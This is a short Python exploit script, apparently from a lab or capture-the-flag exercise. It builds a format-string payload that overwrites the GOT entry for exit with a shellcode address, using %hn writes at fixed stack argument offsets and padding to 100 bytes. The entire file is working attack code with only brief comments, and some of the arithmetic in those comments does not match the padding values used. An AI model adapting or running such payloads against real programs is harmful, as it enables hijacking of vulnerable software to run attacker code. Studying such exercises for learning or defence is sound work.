import struct


"""
We want to write the bytes of our shellcode address at the address of exit in
the GOT.

"""

SHELLCODE_ADDR = 0xffffdf8a # 65535 + 57226
EXIT_PLT = 0x080497e0 # 3876 + 38904

def pad(s):
    return s + ("A" * (100 - len(s)))

exploit = ""
exploit += struct.pack("I", EXIT_PLT) # 10th argument on the stack
exploit += struct.pack("I", EXIT_PLT + 2) # 11th argument on the stack
exploit += "AAAABBBB" #12th, 13th arguments on the stack
exploit += "%10$57210x"
exploit += "%10$hn"
exploit += "%11$8309x"
exploit += "%11$hn"

print(pad(exploit))